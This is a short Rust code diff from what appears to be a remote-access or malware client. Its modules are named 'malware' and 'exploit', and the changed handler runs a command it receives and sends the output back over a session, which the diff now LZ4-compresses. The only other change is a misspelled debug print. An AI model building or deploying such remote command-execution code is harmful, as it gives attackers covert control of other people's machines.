@@ -2,7 +2,7 @@ use std::{env, fs::File, net::Shutdown, io::{Read, Write}};
 use bstr::ByteSlice;
 use crate::malware::{Exploits, HandleExploits};
 use crate::stprotocol::{Client, HandleProtocols, HandleSession, Session};
-use crate::structure::{Detector, StructStone, response, disconnect, download, upload, exploit};
+use crate::structure::{Detector, StructStone, response, disconnect, download, upload, exploit, CompressHandler};
 
 impl Client {
     pub fn new(ip: &str) -> Client {
@@ -87,8 +87,10 @@ impl HandleProtocols for Client {
     }
 
     fn exploit(&mut self) -> Result<&StructStone, &StructStone> {
+        println!("exlpoit");
         self.exploits.execute(self.get_command());
-        let output = exploit(self.exploits.get_output());
+        let mut output = exploit(self.exploits.get_output());
+        output.lz4_compress();
         self.set_packet(output);
         self.session.send()
     }
